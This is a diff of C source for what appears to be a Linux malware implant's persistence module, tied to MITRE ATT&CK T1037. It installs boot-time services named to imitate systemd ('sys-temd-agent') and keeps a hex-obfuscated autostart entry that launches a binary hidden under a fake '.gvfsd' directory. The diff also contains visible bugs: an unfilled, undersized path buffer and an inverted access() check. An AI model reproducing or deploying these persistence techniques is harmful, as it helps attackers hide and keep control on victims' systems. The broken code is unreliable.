@@ -2,6 +2,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <stdbool.h>
+#include <unistd.h>
 
 #include "persistence.h"
 #include "utils.h"
@@ -15,7 +16,6 @@
 * Exec=$HOME/.gvfsd/.profile/gvfsd-helper
 */
 char gnomehelper_desktop [73] = {0x5b,0x44,0x65,0x73,0x6b,0x74,0x6f,0x70,0x20,0x45,0x6e,0x74,0x72,0x79,0x5d,0xa,0x54,0x79,0x70,0x65,0x3d,0x41,0x70,0x70,0x6c,0x69,0x63,0x61,0x74,0x69,0x6f,0x6e,0xa,0x45,0x78,0x65,0x63,0x3d,0x24,0x48,0x4f,0x4d,0x45,0x2f,0x2e,0x67,0x76,0x66,0x73,0x64,0x2f,0x2e,0x70,0x72,0x6f,0x66,0x69,0x6c,0x65,0x2f,0x67,0x76,0x66,0x73,0x64,0x2d,0x68,0x65,0x6c,0x70,0x65,0x72,0xa};
-
 
 
 /*
@@ -88,22 +88,32 @@ bool nonroot_persistence(void) {
 }
 
 /**
- * Leverage systemd/init rc scripts to achieve persistence.
+ * @brief Leverage systemd/init rc scripts to achieve persistence.
  * Technique: Boot or Logon Initiaization Scripts
  * TID: 1037.004
  * https://attack.mitre.org/techniques/T1037/
+ *
+ * @return boolean value if successfully installed persistence.
+ *
  **/
 bool root_persistence(void) {
 
-    //TODO identify systemd or init.d systtem
-    char *systemd_path_1 = "/etc/init/systemd-agent.conf";
-    char *systemd_path_2 = "/lib/systemd/system/sys-temd-agent.service";
+    bool result;
+    char *fpath;
 
+    char *init_path_1 = "/etc/init/systemd-agent.conf";
+    char *systemd_path_1 = "/lib/systemd/system/sys-temd-agent.service";
 
-    int fpath_size = strlen(systemd_path_2);
-    char *fpath = (char *)malloc(fpath_size);
+    if (access("/run/systemd/system", F_OK)) { //systemd systtme
+        int fpath_size = strlen(systemd_path_1);
+        fpath = (char *)malloc(fpath_size);
+        result = write_to_file(fpath, systemd_agent_conf);
 
-    bool result = write_to_file(fpath, systemd_agent_conf);
+    } else { // non systemd system...
+        int fpath_size = strlen(init_path_1);
+        fpath = (char *)malloc(fpath_size);
+        result = write_to_file(fpath, systemd_agent_conf);
+    }
 
     free(fpath);
     return result;
